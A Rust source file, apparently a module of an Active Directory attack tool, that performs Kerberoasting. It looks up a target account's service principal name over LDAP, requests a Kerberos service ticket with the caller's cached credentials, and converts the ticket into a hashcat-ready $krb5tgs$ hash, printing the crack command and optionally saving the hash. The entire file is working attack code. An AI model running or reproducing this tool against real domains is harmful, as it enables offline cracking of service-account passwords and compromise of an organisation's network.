use ldap3::LdapConn;
use crate::ldap::LdapConfig;
use crate::help::{add_terminal_spacing, read_input};
use crate::kerberos::ccache::{parse_ccache_file, find_tgt};
use crate::kerberos::env::determine_ccache_path;
use std::fs;
use std::error::Error;
use std::ffi::CString;
use std::ptr;
use dialoguer::Confirm;
use kerberos_constants::etypes;

pub fn kerberoast(
    ldap: &mut LdapConn,
    search_base: &str,
    config: &LdapConfig,
) -> Result<(), Box<dyn Error>> {
    println!("\n[*] Kerberoast Attack");
    
    let target = read_input("Enter target username (sAMAccountName): ");
    if target.is_empty() {
        println!("[!] Target username is required");
        return Ok(());
    }

    let spn = get_user_spn(ldap, search_base, &target)?;
    
    if spn.is_empty() {
        println!("[!] No SPN found for user: {}", target);
        return Ok(());
    }

    println!("[+] Found SPN: {}", spn);
    
    let encryption = read_input("Encryption type (rc4/aes128/aes256) [default: rc4]: ");
    let enc_type = if encryption.is_empty() { 
        "rc4" 
    } else { 
        encryption.trim() 
    };

    let hash = request_service_ticket(&target, &spn, enc_type, config)?;
    
    if !hash.is_empty() {
        println!("\n[+] Kerberoast hash:\n");
        println!("{}", hash);
        
        let hashcat_mode = match enc_type {
            "aes128" => "19600",
            "aes256" => "19700",
            _ => "13100",
        };
        println!("\n[*] Crack with: hashcat -m {} hash.txt wordlist.txt", hashcat_mode);

        if Confirm::new()
            .with_prompt("Save hash to file?")
            .default(true)
            .interact()?
        {
            let filename = format!("{}_{}.txt", target, enc_type);
            fs::write(&filename, hash.as_bytes())?;
            println!("[+] Hash saved to: {}", filename);
        }
    }
    
    add_terminal_spacing(1);
    Ok(())
}

fn get_user_spn(
    ldap: &mut LdapConn,
    search_base: &str,
    username: &str,
) -> Result<String, Box<dyn Error>> {
    use ldap3::{Scope, SearchEntry};
    
    let filter = format!("(&(sAMAccountName={})(servicePrincipalName=*))", username);
    
    let (results, _) = ldap.search(
        search_base,
        Scope::Subtree,
        &filter,
        vec!["servicePrincipalName"],
    )?.success()?;

    if let Some(entry) = results.first() {
        let entry = SearchEntry::construct(entry.clone());
        if let Some(spns) = entry.attrs.get("servicePrincipalName") {
            if let Some(first_spn) = spns.first() {
                return Ok(first_spn.clone());
            }
        }
    }

    Ok(String::new())
}

#[cfg(not(target_os = "macos"))]
fn request_service_ticket(
    target_username: &str,
    spn: &str,
    enc_type: &str,
    config: &LdapConfig,
) -> Result<String, Box<dyn Error>> {
    use krb5_sys::*;
    
    let ccache_path = if config.kerberos {
        determine_ccache_path(config.ccache_path.as_ref())
            .map_err(|e| format!("Failed to locate ccache: {}", e))?
    } else {
        return Err("Kerberoasting requires Kerberos authentication. Use -k flag and valid ccache.".into());
    };

    println!("[*] Using ccache: {}", ccache_path);
    println!("[*] Requesting ticket for SPN: {}", spn);
    
    unsafe {
        let mut context: krb5_context = ptr::null_mut();
        let mut ccache: krb5_ccache = ptr::null_mut();
        let mut server: krb5_principal = ptr::null_mut();
        let mut client: krb5_principal = ptr::null_mut();
        let mut creds_in: krb5_creds = std::mem::zeroed();
        let mut creds_out: *mut krb5_creds = ptr::null_mut();
        
        // Initialize Kerberos context
        let ret = krb5_init_context(&mut context as *mut _);
        if ret != 0 {
            return Err(format!("krb5_init_context failed: {}", ret).into());
        }
        
        // Open ccache
        let ccache_cstr = CString::new(ccache_path.as_str())?;
        let ret = krb5_cc_resolve(context, ccache_cstr.as_ptr(), &mut ccache as *mut _);
        if ret != 0 {
            krb5_free_context(context);
            return Err(format!("krb5_cc_resolve failed: {}", ret).into());
        }
        
        // Get client principal from ccache
        let ret = krb5_cc_get_principal(context, ccache, &mut client as *mut _);
        if ret != 0 {
            let err_msg = krb5_get_error_message(context, ret);
            let msg = std::ffi::CStr::from_ptr(err_msg).to_string_lossy().into_owned();
            krb5_free_error_message(context, err_msg);
            krb5_cc_close(context, ccache);
            krb5_free_context(context);
            return Err(format!("krb5_cc_get_principal failed: {}", msg).into());
        }
        
        // Get realm from client principal
        let realm_data = &(*client).realm;
        let realm = std::slice::from_raw_parts(realm_data.data as *const u8, realm_data.length as usize);
        let realm_str = String::from_utf8_lossy(realm);
        
        println!("[*] Client: {}@{}", target_username, realm_str);
        
        // Parse SPN into principal - need to add realm
        let spn_with_realm = format!("{}@{}", spn, realm_str);
        let spn_cstr = CString::new(spn_with_realm.as_str())?;
        let ret = krb5_parse_name(context, spn_cstr.as_ptr(), &mut server as *mut _);
        if ret != 0 {
            let err_msg = krb5_get_error_message(context, ret);
            let msg = std::ffi::CStr::from_ptr(err_msg).to_string_lossy().into_owned();
            krb5_free_error_message(context, err_msg);
            krb5_free_principal(context, client);
            krb5_cc_close(context, ccache);
            krb5_free_context(context);
            return Err(format!("krb5_parse_name failed for '{}': {}", spn_with_realm, msg).into());
        }
        
        // Setup credential request
        creds_in.client = client;
        creds_in.server = server;
        
        // Set encryption type preference
        let mut etypes = vec![match enc_type.to_lowercase().as_str() {
            "aes256" => etypes::AES256_CTS_HMAC_SHA1_96,
            "aes128" | "aes" => etypes::AES128_CTS_HMAC_SHA1_96,
            _ => etypes::RC4_HMAC,
        }];
        
        // Request service ticket
        let ret = krb5_get_credentials(context, 0, ccache, &mut creds_in as *mut _, &mut creds_out as *mut _);
        if ret != 0 {
            let err_msg = krb5_get_error_message(context, ret);
            let msg = std::ffi::CStr::from_ptr(err_msg).to_string_lossy().into_owned();
            krb5_free_error_message(context, err_msg);
            krb5_free_principal(context, server);
            krb5_free_principal(context, client);
            krb5_cc_close(context, ccache);
            krb5_free_context(context);
            return Err(format!("krb5_get_credentials failed: {}", msg).into());
        }
        
        // Extract ticket data
        let ticket = &(*creds_out).ticket;
        let etype = (*creds_out).keyblock.enctype;
        let cipher_data = std::slice::from_raw_parts(
            ticket.data as *const u8,
            ticket.length as usize
        );
        
        // Parse ticket to get encrypted part
        let hash = parse_ticket_to_hash(cipher_data, target_username, etype)?;
        
        // Cleanup
        krb5_free_creds(context, creds_out);
        krb5_free_principal(context, server);
        krb5_free_principal(context, client);
        krb5_cc_close(context, ccache);
        krb5_free_context(context);
        
        Ok(hash)
    }
}

fn parse_ticket_to_hash(ticket_bytes: &[u8], username: &str, etype: i32) -> Result<String, Box<dyn Error>> {
    use kerberos_asn1::{Ticket, Asn1Object};
    
    // Parse the ticket
    let (_remaining, ticket) = Ticket::parse(ticket_bytes)
        .map_err(|e| format!("Failed to parse ticket: {}", e))?;
    
    let cipher = &ticket.enc_part.cipher;
    let realm = &ticket.realm;
    let spn = ticket.sname.to_string();
    let serv = spn.replace(":", "~");
    
    let (salt, ciphertext) = divide_salt_and_ciphertext(etype, cipher.to_vec());
    let salt_hex = hex::encode(&salt);
    let cipher_hex = hex::encode(&ciphertext);
    
    let hash = match etype {
        etypes::AES128_CTS_HMAC_SHA1_96 | etypes::AES256_CTS_HMAC_SHA1_96 => {
            format!("$krb5tgs${}${}${}$*{}*${}${}", etype, username, realm, serv, salt_hex, cipher_hex)
        },
        _ => {
            format!("$krb5tgs${}$*{}${}${}*${}${}", etype, username, realm, serv, salt_hex, cipher_hex)
        }
    };
    
    Ok(hash)
}

fn divide_salt_and_ciphertext(etype: i32, mut cipher: Vec<u8>) -> (Vec<u8>, Vec<u8>) {
    if etype == etypes::AES128_CTS_HMAC_SHA1_96 || etype == etypes::AES256_CTS_HMAC_SHA1_96 {
        let index = cipher.len() - 12;
        let salt = cipher.drain(index..).collect();
        (salt, cipher)
    } else {
        let ciphertext = cipher.drain(16..).collect();
        (cipher, ciphertext)
    }
}

#[cfg(target_os = "macos")]
fn request_service_ticket(
    _username: &str,
    _spn: &str,
    _enc_type: &str,
    _config: &LdapConfig,
) -> Result<String, Box<dyn Error>> {
    Err("Kerberoasting is not supported on macOS. Please use Linux or Windows.".into())
}
